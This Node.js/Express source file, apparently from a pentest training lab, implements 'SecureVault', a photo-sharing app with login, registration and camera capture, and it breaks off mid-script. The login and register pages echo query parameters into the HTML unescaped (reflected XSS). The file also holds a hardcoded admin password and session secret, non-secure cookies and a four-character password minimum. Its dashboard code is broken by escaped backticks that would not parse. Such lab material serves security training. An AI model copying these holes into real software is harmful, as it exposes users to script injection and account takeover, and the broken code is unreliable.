const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// ============ MIDDLEWARE ============
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Session config
app.use(session({
    secret: 'sup3r-s3cr3t-k3y-f0r-p3nt3st-l4b-2026',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: false,
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// ============ DATA LAYER (File-based) ============
const DATA_DIR = path.join(__dirname, 'data');
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Ensure directories exist
[DATA_DIR, UPLOADS_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

function readJSON(filename) {
    const filePath = path.join(DATA_DIR, filename);
    if (!fs.existsSync(filePath)) return [];
    try {
        return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
    } catch { return []; }
}

function writeJSON(filename, data) {
    fs.writeFileSync(path.join(DATA_DIR, filename), JSON.stringify(data, null, 2));
}

// ============ AUTH MIDDLEWARE ============
function requireAuth(req, res, next) {
    if (!req.session.user) {
        return res.redirect('/login');
    }
    next();
}

function requireAdmin(req, res, next) {
    if (!req.session.user || !req.session.user.isAdmin) {
        return res.status(403).send('Access Denied');
    }
    next();
}

// ============ INITIAL SETUP ============
// Create admin account on first run
const users = readJSON('users.json');
if (users.length === 0) {
    const adminHash = bcrypt.hashSync('mcmcmcmc@#@#@#@#', 10);
    users.push({
        id: 'admin-' + uuidv4().slice(0,8),
        username: "hello Hacker's",
        password: adminHash,
        isAdmin: true,
        isActive: true,
        createdAt: new Date().toISOString()
    });
    writeJSON('users.json', users);
    console.log('[SETUP] Admin account created: hello Hacker\'s');
}

// ============ ROUTES ============

// ---- AUTH ROUTES ----

// GET /login
app.get('/login', (req, res) => {
    if (req.session.user) return res.redirect('/dashboard');
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureVault - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
            padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
            width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        h2 { color: #fff; text-align: center; margin-bottom: 30px; font-size: 28px;
            letter-spacing: 1px; }
        h2 span { color: #00d4ff; }
        .input-group { margin-bottom: 20px; }
        label { color: #b0b0b0; display: block; margin-bottom: 8px; font-size: 14px; }
        input { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15); border-radius: 12px;
            color: #fff; font-size: 15px; transition: 0.3s; outline: none; }
        input:focus { border-color: #00d4ff; box-shadow: 0 0 15px rgba(0,212,255,0.2); }
        input::placeholder { color: #666; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #00d4ff, #0083ff);
            border: none; border-radius: 12px; color: #fff; font-size: 16px;
            font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,212,255,0.3); }
        .link { text-align: center; margin-top: 20px; color: #666; font-size: 14px; }
        .link a { color: #00d4ff; text-decoration: none; }
        .link a:hover { text-decoration: underline; }
        .error { color: #ff4757; text-align: center; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Secure<span>Vault</span></h2>
        ${req.query.error ? '<div class="error">⚠️ ' + req.query.error + '</div>' : ''}
        <form action="/login" method="POST">
            <div class="input-group">
                <label>Username</label>
                <input type="text" name="username" placeholder="Enter username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter password" required>
            </div>
            <button type="submit" class="btn">Sign In →</button>
        </form>
        <div class="link">
            Don't have an account? <a href="/register">Register here</a>
        </div>
    </div>
</body>
</html>
    `);
});

// POST /login
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const users = readJSON('users.json');
    const user = users.find(u => u.username === username && u.isActive);
    
    if (!user || !bcrypt.compareSync(password, user.password)) {
        return res.redirect('/login?error=Invalid credentials');
    }
    
    req.session.user = {
        id: user.id,
        username: user.username,
        isAdmin: user.isAdmin || false
    };
    
    // Log admin login notification
    if (user.isAdmin) {
        console.log('[ADMIN LOGIN] Admin logged in at', new Date().toISOString());
        return res.redirect('/admin');
    }
    
    res.redirect('/dashboard');
});

// GET /register
app.get('/register', (req, res) => {
    if (req.session.user) return res.redirect('/dashboard');
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureVault - Register</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
            padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
            width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        h2 { color: #fff; text-align: center; margin-bottom: 30px; font-size: 28px;
            letter-spacing: 1px; }
        h2 span { color: #00d4ff; }
        .input-group { margin-bottom: 20px; }
        label { color: #b0b0b0; display: block; margin-bottom: 8px; font-size: 14px; }
        input { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15); border-radius: 12px;
            color: #fff; font-size: 15px; transition: 0.3s; outline: none; }
        input:focus { border-color: #00d4ff; box-shadow: 0 0 15px rgba(0,212,255,0.2); }
        input::placeholder { color: #666; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #00d4ff, #0083ff);
            border: none; border-radius: 12px; color: #fff; font-size: 16px;
            font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,212,255,0.3); }
        .link { text-align: center; margin-top: 20px; color: #666; font-size: 14px; }
        .link a { color: #00d4ff; text-decoration: none; }
        .link a:hover { text-decoration: underline; }
        .success { color: #2ed573; text-align: center; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📝 Create <span>Account</span></h2>
        ${req.query.msg ? '<div class="success">✅ ' + req.query.msg + '</div>' : ''}
        <form action="/register" method="POST">
            <div class="input-group">
                <label>Username</label>
                <input type="text" name="username" placeholder="Choose a username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Choose a password" required>
            </div>
            <button type="submit" class="btn">Create Account →</button>
        </form>
        <div class="link">
            Already have an account? <a href="/login">Login here</a>
        </div>
    </div>
</body>
</html>
    `);
});

// POST /register
app.post('/register', (req, res) => {
    const { username, password } = req.body;
    const users = readJSON('users.json');
    
    if (users.find(u => u.username === username)) {
        return res.render('register', { error: 'Username already exists' });
    }
    
    if (password.length < 4) {
        return res.render('register', { error: 'Password must be at least 4 characters' });
    }
    
    const hash = bcrypt.hashSync(password, 10);
    const newUser = {
        id: uuidv4(),
        username,
        password: hash,
        isAdmin: false,
        isActive: true,
        createdAt: new Date().toISOString()
    };
    
    users.push(newUser);
    writeJSON('users.json', users);
    
    console.log('[NEW USER]', username, 'registered at', new Date().toISOString());
    res.redirect('/login?msg=Account created! Please login.');
});

// GET /logout
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

// ---- USER DASHBOARD ----
app.get('/dashboard', requireAuth, (req, res) => {
    const photos = readJSON('photos.json');
    const userPhotos = photos.filter(p => p.ownerId === req.session.user.id);
    
    res.send(\`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SecureVault</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0c29; color: #fff; min-height: 100vh;
        }
        nav {
            background: rgba(255,255,255,0.05); backdrop-filter: blur(10px);
            padding: 16px 40px; display: flex; justify-content: space-between;
            align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        nav .logo { font-size: 22px; font-weight: 700; }
        nav .logo span { color: #00d4ff; }
        nav .user-info { display: flex; align-items: center; gap: 20px; }
        nav .user-info span { color: #b0b0b0; }
        nav a { color: #ff4757; text-decoration: none; padding: 8px 20px;
            border: 1px solid #ff4757; border-radius: 8px; font-size: 14px; transition: 0.3s; }
        nav a:hover { background: #ff4757; color: #fff; }
        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
        .hero {
            background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(0,131,255,0.05));
            border: 1px solid rgba(0,212,255,0.2); border-radius: 20px; padding: 40px;
            text-align: center; margin-bottom: 40px;
        }
        .hero h1 { font-size: 32px; margin-bottom: 10px; }
        .hero p { color: #b0b0b0; font-size: 16px; }
        .card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px; padding: 30px; margin-bottom: 30px; }
        .card h3 { margin-bottom: 20px; color: #00d4ff; }
        .btn-primary { background: linear-gradient(135deg, #00d4ff, #0083ff);
            color: #fff; border: none; padding: 12px 30px; border-radius: 10px;
            font-size: 16px; cursor: pointer; transition: 0.3s; font-weight: 600; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,212,255,0.3); }
        .btn-danger { background: #ff4757; color: #fff; border: none; padding: 8px 16px;
            border-radius: 8px; cursor: pointer; font-size: 13px; }
        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px; margin-top: 20px; }
        .photo-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px; overflow: hidden; transition: 0.3s; }
        .photo-card:hover { transform: translateY(-4px); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .photo-card img { width: 100%; height: 200px; object-fit: cover; }
        .photo-card .info { padding: 15px; }
        .photo-card .info .link-box { 
            background: rgba(0,0,0,0.3); padding: 8px 12px; border-radius: 6px;
            font-size: 12px; color: #00d4ff; word-break: break-all; margin-top: 8px;
            cursor: pointer; }
        .photo-card .info .meta { color: #666; font-size: 12px; margin-top: 8px; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-box { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px; padding: 20px; text-align: center; }
        .stat-box .num { font-size: 28px; font-weight: 700; color: #00d4ff; }
        .stat-box .label { color: #666; font-size: 13px; margin-top: 5px; }
        /* Camera preview */
        #camera-preview { display: none; width: 100%; max-width: 400px;
            border-radius: 12px; margin: 20px auto; }
        .loading { text-align: center; padding: 40px; color: #666; }
        .hidden { display: none; }
        input[type="text"] { width: 100%; padding: 12px 16px; background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15); border-radius: 10px; color: #fff;
            font-size: 14px; margin-bottom: 15px; outline: none; }
        input[type="text"]:focus { border-color: #00d4ff; }
        .toast { position: fixed; bottom: 30px; right: 30px; background: #2ed573;
            color: #fff; padding: 14px 24px; border-radius: 10px; font-size: 14px;
            display: none; z-index: 9999; box-shadow: 0 10px 30px rgba(46,213,115,0.3); }
        .copy-btn { background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3);
            color: #00d4ff; padding: 4px 12px; border-radius: 6px; cursor: pointer;
            font-size: 12px; margin-left: 8px; }
    </style>
</head>
<body>
    <nav>
        <div class="logo">📸 Secure<span>Vault</span></div>
        <div class="user-info">
            <span>👤 \${req.session.user.username}</span>
            <a href="/logout">Logout</a>
        </div>
    </nav>
    
    <div class="container">
        <div class="hero">
            <h1>Welcome, \${req.session.user.username}! 🎯</h1>
            <p>Upload or capture a photo to generate a secure shareable link.</p>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="num">\${userPhotos.length}</div>
                <div class="label">Total Photos</div>
            </div>
            <div class="stat-box">
                <div class="num">\${userPhotos.filter(p => p.views).length}</div>
                <div class="label">Viewed Photos</div>
            </div>
            <div class="stat-box">
                <div class="num">\${userPhotos.reduce((sum, p) => sum + (p.views || 0), 0)}</div>
                <div class="label">Total Views</div>
            </div>
        </div>
        
        <div class="card">
            <h3>📤 Upload / Capture Photo</h3>
            <div style="display:flex;gap:20px;flex-wrap:wrap;">
                <div style="flex:1;min-width:280px;">
                    <p style="color:#b0b0b0;margin-bottom:15px;">Upload from device:</p>
                    <input type="file" id="fileInput" accept="image/*" style="display:none;">
                    <button class="btn-primary" onclick="document.getElementById('fileInput').click()">Choose File</button>
                </div>
                <div style="flex:1;min-width:280px;">
                    <p style="color:#b0b0b0;margin-bottom:15px;">Or capture from camera:</p>
                    <button class="btn-primary" id="openCameraBtn">📷 Open Camera</button>
                    <video id="cameraPreview" autoplay playsinline style="width:100%;max-width:320px;border-radius:12px;margin-top:15px;display:none;"></video>
                    <canvas id="photoCanvas" style="display:none;"></canvas>
                    <button id="captureBtn" class="btn-primary" style="display:none;margin-top:10px;">Capture Photo</button>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h3>📸 Your Photos</h3>
            \${userPhotos.length === 0 ? '<p style="color:#666;">No photos yet. Upload or capture one above!</p>' : ''}
            <div class="photo-grid">
                \${userPhotos.map(p => \`
                <div class="photo-card">
                    <img src="/uploads/\${p.fileName}" alt="Photo">
                    <div class="info">
                        <div class="link-box" onclick="copyToClipboard('\${req.protocol}://\${req.get('host')}/view/\${p.shareId}')">
                            🔗 \${req.protocol}://\${req.get('host')}/view/\${p.shareId}
                            <span class="copy-btn">Copy</span>
                        </div>
                        <div class="meta">
                            📅 \${new Date(p.createdAt).toLocaleString()} &bull; 👁️ \${p.views || 0} views
                        </div>
                    </div>
                </div>
                \`).join('')}
            </div>
        </div>
    </div>
    
    <div class="toast" id="toast">✅ Link copied to clipboard!</div>
    
    <script>
        // File upload handler
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = function(e) {
                uploadPhoto(e.target.result);
            };
            reader.readAsDataURL(file);
        });
        
        // Camera handling
        let stream = null;
        const openBtn = document.getElementById('openCameraBtn');
        const video = document.getElementById('cameraPreview');
        const canvas = document.getElementById('photoCanvas');
        const captureBtn = document.getElementById('captureBtn');
        
        openBtn.addEventListener('click', async function() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                video.srcObject = stream;
                video.style.display = 'block';
                captureBtn.style.display = 'inline-block';
                openBtn.textContent = '📷 Camera Active';
                openBtn.style.background = '#2ed573';
            } catch(err) {
                alert('Camera access denied or not available: ' + err.message);
            }
        });
        
        captureBtn.addEventListener('click', function() {
            canvas.width = video.videoWidth || 640;
